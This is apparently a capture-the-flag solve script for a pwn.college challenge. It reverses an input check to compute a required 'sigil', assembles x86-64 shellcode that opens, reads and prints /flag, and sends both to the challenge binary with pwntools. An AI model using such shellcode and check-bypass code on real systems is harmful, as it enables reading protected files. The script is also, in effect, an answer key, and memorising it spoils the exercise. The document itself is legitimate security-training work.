# Misc - Takeshi's Castle
# https://pwn.college/academy-ctf-v2~020f0262/misc/takeshis-castle

import pwn
from dojotool import find_challenge, submit

SIGIL_CHECK_DATA = (
    b"\x43\x87\x02\xf1\x91\xfa\x1f\xd5\x56\x25\x76\x94\xb4"
    b"\x97\x82\x81\x25\xfd\x04\x34\x8b\x21\xda\x43\xd7"
)


def to_int32(x: int) -> int:
    x &= 0xFFFFFFFF
    return x - 0x100000000 if x >= 0x80000000 else x


def solve_sigil() -> bytes:
    sigil = bytearray(len(SIGIL_CHECK_DATA))
    v5, v6, v7 = -36, 0, -49
    for i, target in enumerate(SIGIL_CHECK_DATA):
        v9_low = (target - (v5 & 0xFF)) & 0xFF
        x = ((v9_low << 2) | (v9_low >> 6)) & 0xFF
        sigil[i] = x ^ ((v7 + v6) & 0xFF)
        v7_plus_v6 = to_int32(v7 + v6)
        v9 = to_int32((v7_plus_v6 & 0xFFFFFF00) | v9_low)
        v10 = to_int32(v5 + v9)
        assert (v10 & 0xFF) == target
        v6 = to_int32(v6 + 17)
        v5 = to_int32(v5 + 43)
        v7 = to_int32(v10 + to_int32(i - 125 * v7))
    return bytes(sigil)


def build_shellcode() -> bytes:
    return pwn.asm("""
        /* open("/flag", O_RDONLY) */
        lea rdi, [rip + path]
        xor esi, esi
        xor edx, edx
        mov eax, 2
        syscall

        /* read(fd, buf, 0x100) */
        mov edi, eax
        lea rsi, [rip + buf]
        mov edx, 0x100
        xor eax, eax
        syscall

        /* write(1, buf, n) */
        mov edx, eax
        mov edi, 1
        lea rsi, [rip + buf]
        mov eax, 1
        syscall

        /* exit_group(0) */
        xor edi, edi
        mov eax, 231
        syscall

    path:
        .asciz "/flag"
    buf:
        .zero 0x100
    """)


def ctf() -> None:
    sigil = solve_sigil()
    shellcode = build_shellcode()
    root_bin = find_challenge()

    with pwn.process(root_bin) as io:
        io.sendlineafter(b"sigil: ", sigil)
        io.sendlineafter(b"blob: ", shellcode.hex().encode())
        data = io.recvrepeat()

    submit(data)


if __name__ == "__main__":
    ctf()
